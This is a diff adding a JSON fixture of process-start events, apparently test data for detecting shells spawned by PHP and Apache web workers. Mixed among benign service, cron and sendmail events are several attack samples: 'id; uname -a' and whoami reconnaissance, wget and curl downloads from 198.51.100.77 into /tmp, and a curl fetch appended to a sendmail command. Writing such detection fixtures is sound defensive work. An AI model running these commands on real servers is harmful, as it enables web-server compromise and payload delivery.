@@ -1,0 +1,417 @@
+[
+  {
+    "@timestamp": "2026-10-22T01:00:02.000Z",
+    "event": {
+      "id": "php-evt-0001",
+      "category": [
+        "process"
+      ],
+      "type": [
+        "start"
+      ],
+      "action": "start"
+    },
+    "host": {
+      "name": "web-blog-01",
+      "os": {
+        "type": "linux"
+      }
+    },
+    "user": {
+      "name": "root"
+    },
+    "process": {
+      "name": "php-fpm8.4",
+      "executable": "/usr/sbin/php-fpm8.4",
+      "command_line": "php-fpm: master process (/etc/php/8.4/fpm/php-fpm.conf)",
+      "parent": {
+        "name": "systemd",
+        "command_line": "/sbin/init",
+        "executable": "/usr/lib/systemd/systemd"
+      }
+    }
+  },
+  {
+    "@timestamp": "2026-10-22T01:00:05.000Z",
+    "event": {
+      "id": "php-evt-0002",
+      "category": [
+        "process"
+      ],
+      "type": [
+        "start"
+      ],
+      "action": "start"
+    },
+    "host": {
+      "name": "web-shop-01",
+      "os": {
+        "type": "linux"
+      }
+    },
+    "user": {
+      "name": "root"
+    },
+    "process": {
+      "name": "apache2",
+      "executable": "/usr/sbin/apache2",
+      "command_line": "/usr/sbin/apache2 -k start",
+      "parent": {
+        "name": "systemd",
+        "command_line": "/sbin/init",
+        "executable": "/usr/lib/systemd/systemd"
+      }
+    }
+  },
+  {
+    "@timestamp": "2026-10-22T02:00:01.000Z",
+    "event": {
+      "id": "php-evt-0003",
+      "category": [
+        "process"
+      ],
+      "type": [
+        "start"
+      ],
+      "action": "start"
+    },
+    "host": {
+      "name": "web-shop-01",
+      "os": {
+        "type": "linux"
+      }
+    },
+    "user": {
+      "name": "deploy"
+    },
+    "process": {
+      "name": "php8.3",
+      "executable": "/usr/bin/php8.3",
+      "command_line": "php /var/www/shop/bin/console cache:clear",
+      "parent": {
+        "name": "cron",
+        "command_line": "/usr/sbin/cron -f",
+        "executable": "/usr/sbin/cron"
+      }
+    }
+  },
+  {
+    "@timestamp": "2026-10-22T02:00:03.000Z",
+    "event": {
+      "id": "php-evt-0004",
+      "category": [
+        "process"
+      ],
+      "type": [
+        "start"
+      ],
+      "action": "start"
+    },
+    "host": {
+      "name": "web-shop-01",
+      "os": {
+        "type": "linux"
+      }
+    },
+    "user": {
+      "name": "deploy"
+    },
+    "process": {
+      "name": "sh",
+      "executable": "/usr/bin/dash",
+      "command_line": "sh -c git -C /var/www/shop rev-parse HEAD",
+      "parent": {
+        "name": "php8.3",
+        "command_line": "php /var/www/shop/bin/console cache:clear",
+        "executable": "/usr/bin/php8.3"
+      }
+    }
+  },
+  {
+    "@timestamp": "2026-10-22T09:14:20.000Z",
+    "event": {
+      "id": "php-evt-0005",
+      "category": [
+        "process"
+      ],
+      "type": [
+        "start"
+      ],
+      "action": "start"
+    },
+    "host": {
+      "name": "web-blog-01",
+      "os": {
+        "type": "linux"
+      }
+    },
+    "user": {
+      "name": "www-data"
+    },
+    "process": {
+      "name": "sh",
+      "executable": "/usr/bin/dash",
+      "command_line": "sh -c /usr/sbin/sendmail -t -i",
+      "parent": {
+        "name": "php-fpm8.4",
+        "command_line": "php-fpm: pool www",
+        "executable": "/usr/sbin/php-fpm8.4"
+      }
+    }
+  },
+  {
+    "@timestamp": "2026-10-22T10:02:44.000Z",
+    "event": {
+      "id": "php-evt-0006",
+      "category": [
+        "process"
+      ],
+      "type": [
+        "start"
+      ],
+      "action": "start"
+    },
+    "host": {
+      "name": "web-shop-01",
+      "os": {
+        "type": "linux"
+      }
+    },
+    "user": {
+      "name": "www-data"
+    },
+    "process": {
+      "name": "sh",
+      "executable": "/usr/bin/dash",
+      "command_line": "sh -c convert /var/www/shop/uploads/p1042.jpg -resize 300x300 /var/www/shop/uploads/thumb_p1042.jpg",
+      "parent": {
+        "name": "apache2",
+        "command_line": "/usr/sbin/apache2 -k start",
+        "executable": "/usr/sbin/apache2"
+      }
+    }
+  },
+  {
+    "@timestamp": "2026-10-22T13:41:07.000Z",
+    "event": {
+      "id": "php-evt-0007",
+      "category": [
+        "process"
+      ],
+      "type": [
+        "start"
+      ],
+      "action": "start"
+    },
+    "host": {
+      "name": "web-api-01",
+      "os": {
+        "type": "linux"
+      }
+    },
+    "user": {
+      "name": "www-data"
+    },
+    "process": {
+      "name": "sh",
+      "executable": "/usr/bin/dash",
+      "command_line": "sh -c id; uname -a",
+      "parent": {
+        "name": "php-fpm8.2",
+        "command_line": "php-fpm: pool www",
+        "executable": "/usr/sbin/php-fpm8.2"
+      }
+    }
+  },
+  {
+    "@timestamp": "2026-10-22T13:41:07.100Z",
+    "event": {
+      "id": "php-evt-0008",
+      "category": [
+        "process"
+      ],
+      "type": [
+        "start"
+      ],
+      "action": "start"
+    },
+    "host": {
+      "name": "web-api-01",
+      "os": {
+        "type": "linux"
+      }
+    },
+    "user": {
+      "name": "www-data"
+    },
+    "process": {
+      "name": "uname",
+      "executable": "/usr/bin/uname",
+      "command_line": "uname -a",
+      "parent": {
+        "name": "sh",
+        "command_line": "sh -c id; uname -a",
+        "executable": "/usr/bin/dash"
+      }
+    }
+  },
+  {
+    "@timestamp": "2026-10-22T13:42:30.000Z",
+    "event": {
+      "id": "php-evt-0009",
+      "category": [
+        "process"
+      ],
+      "type": [
+        "start"
+      ],
+      "action": "start"
+    },
+    "host": {
+      "name": "web-api-01",
+      "os": {
+        "type": "linux"
+      }
+    },
+    "user": {
+      "name": "www-data"
+    },
+    "process": {
+      "name": "sh",
+      "executable": "/usr/bin/dash",
+      "command_line": "sh -c cd /tmp; wget -q http://198.51.100.77/x.sh",
+      "parent": {
+        "name": "php-fpm8.2",
+        "command_line": "php-fpm: pool www",
+        "executable": "/usr/sbin/php-fpm8.2"
+      }
+    }
+  },
+  {
+    "@timestamp": "2026-10-22T13:43:02.000Z",
+    "event": {
+      "id": "php-evt-0010",
+      "category": [
+        "process"
+      ],
+      "type": [
+        "start"
+      ],
+      "action": "start"
+    },
+    "host": {
+      "name": "web-api-01",
+      "os": {
+        "type": "linux"
+      }
+    },
+    "user": {
+      "name": "www-data"
+    },
+    "process": {
+      "name": "curl",
+      "executable": "/usr/bin/curl",
+      "command_line": "curl -s -o /tmp/.k http://198.51.100.77/k",
+      "parent": {
+        "name": "php-fpm8.2",
+        "command_line": "php-fpm: pool www",
+        "executable": "/usr/sbin/php-fpm8.2"
+      }
+    }
+  },
+  {
+    "@timestamp": "2026-10-22T14:20:15.000Z",
+    "event": {
+      "id": "php-evt-0011",
+      "category": [
+        "process"
+      ],
+      "type": [
+        "start"
+      ],
+      "action": "start"
+    },
+    "host": {
+      "name": "web-shop-01",
+      "os": {
+        "type": "linux"
+      }
+    },
+    "user": {
+      "name": "www-data"
+    },
+    "process": {
+      "name": "sh",
+      "executable": "/usr/bin/dash",
+      "command_line": "sh -c uname -a; id",
+      "parent": {
+        "name": "apache2",
+        "command_line": "/usr/sbin/apache2 -k start",
+        "executable": "/usr/sbin/apache2"
+      }
+    }
+  },
+  {
+    "@timestamp": "2026-10-22T15:05:40.000Z",
+    "event": {
+      "id": "php-evt-0012",
+      "category": [
+        "process"
+      ],
+      "type": [
+        "start"
+      ],
+      "action": "start"
+    },
+    "host": {
+      "name": "web-blog-01",
+      "os": {
+        "type": "linux"
+      }
+    },
+    "user": {
+      "name": "www-data"
+    },
+    "process": {
+      "name": "sh",
+      "executable": "/usr/bin/dash",
+      "command_line": "sh -c /usr/sbin/sendmail -t -i; curl -s -o /tmp/m http://198.51.100.77/m",
+      "parent": {
+        "name": "php-fpm8.4",
+        "command_line": "php-fpm: pool www",
+        "executable": "/usr/sbin/php-fpm8.4"
+      }
+    }
+  },
+  {
+    "@timestamp": "2026-10-22T16:30:12.000Z",
+    "event": {
+      "id": "php-evt-0013",
+      "category": [
+        "process"
+      ],
+      "type": [
+        "start"
+      ],
+      "action": "start"
+    },
+    "host": {
+      "name": "web-intra-01",
+      "os": {
+        "type": "linux"
+      }
+    },
+    "user": {
+      "name": "www-data"
+    },
+    "process": {
+      "name": "sh",
+      "executable": "/usr/bin/dash",
+      "command_line": "sh -c whoami",
+      "parent": {
+        "name": "php-fpm8.5",
+        "command_line": "php-fpm: pool www"
+      }
+    }
+  }
+]
